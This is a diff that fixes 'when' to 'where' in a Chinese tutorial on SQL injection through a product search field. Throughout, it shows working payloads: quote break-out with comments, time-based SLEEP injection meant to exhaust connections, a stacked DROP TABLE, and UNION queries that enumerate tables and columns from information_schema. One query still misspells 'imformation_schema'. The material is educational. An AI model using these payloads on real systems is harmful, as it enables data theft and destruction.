@@ -34,13 +34,13 @@ SELECT ? FROM ? WHERE ? LIKE '%Hammer%';
 其中`?`表示目前我们并不知道具体的表名和字段名，此SQL唯一可以被操纵的就是单引号里面的输入内容`'%Hammer%`。假如我们直接在查找框里输入一个单引号。即变成
 
 ```sql
-select ? from ? when ? Like '%'%';    
+select ? from ? where ? Like '%'%';    
 ```
 
 这样拼接后造成SQL语法错误，得不到任何结果，我们需要使用`--`来把最后一个单引号注释掉。
 
 ```sql
-select ? from ? when ? Like '%'; -- %';    
+select ? from ? where ? Like '%'; -- %';    
 ```
 
 `--`后的是注释内容(你也可以用`#`），这样你可以得到所有的产品信息，目前为止，还是没有嗅到危险的信号。
@@ -57,7 +57,7 @@ select ? from ? when ? Like '%'; -- %';
 紧紧抓住上一步中可以扩展的单引号部分。来一个简单的延时语句试一试:
 
 ```sql
-select ? from ? when ? Like '%Hammer' and 1 = SLEEP(2); --%';  
+select ? from ? where ? Like '%Hammer' and 1 = SLEEP(2); --%';  
 ```
 
 这时查询会2秒后才返回结果，如果把时间延长，用脚本多点几次查询，一下就能把数据库的连接池用完。
@@ -65,7 +65,7 @@ select ? from ? when ? Like '%Hammer' and 1 = SLEEP(2); --%';
 当然，还有破坏力更强的！
 
 ```sql
-select ? from ? when ? Like '%Hammer'; drop table xxxx; --%'; 
+select ? from ? where ? Like '%Hammer'; drop table xxxx; --%'; 
 ```
 
 可以直接把表/数据库直接删除掉，至于如何知道引数据库中有哪一些表(即如何确定上句SQL中的`xxxx`)呢？
@@ -77,7 +77,7 @@ select ? from ? when ? Like '%Hammer'; drop table xxxx; --%';
 使用`union`可以把不同表的内容拼在一起，小试一下：
 
 ```sql
-select ?,?,?,? from ? when ? Like '%hammer' UNION (select 1,2,3,4 from dual); -- %';  
+select ?,?,?,? from ? where ? Like '%hammer' UNION (select 1,2,3,4 from dual); -- %';  
 ```
 
 | 产品        | 价格  | 生产地   | 生产日期   |
@@ -91,7 +91,7 @@ select ?,?,?,? from ? when ? Like '%hammer' UNION (select 1,2,3,4 from dual); --
 Mysql系统自带的信息都存在`information_schema`数据库中。我们试着在里面找找有用的信息。
 
 ```sql
-select ? from ? when ? Like '%hammer' UNION (select TABLE_NAME,TABLE_SCHEMA,3,4 from information_schema.tables); --%';  
+select ? from ? where ? Like '%hammer' UNION (select TABLE_NAME,TABLE_SCHEMA,3,4 from information_schema.tables); --%';  
 ```
 
 | 产品        | 价格    | 生产地   | 生产日期   |
@@ -108,7 +108,7 @@ select ? from ? when ? Like '%hammer' UNION (select TABLE_NAME,TABLE_SCHEMA,3,4 
 看着列表一猜就能知道我们目前查的是products表，接下来我们再把products具体的字段也挖出来。
 
 ```sql
-select ? from ? when ? Like '%hammer' UNION (select COLUMN_NAME,TABLE_SCHEMA,3,4 from imformation_schema.columns where table_name = 'products'); --%';  
+select ? from ? where ? Like '%hammer' UNION (select COLUMN_NAME,TABLE_SCHEMA,3,4 from imformation_schema.columns where table_name = 'products'); --%';  
 ```
 
 | 产品        | 价格    | 生产地   | 生产日期   |
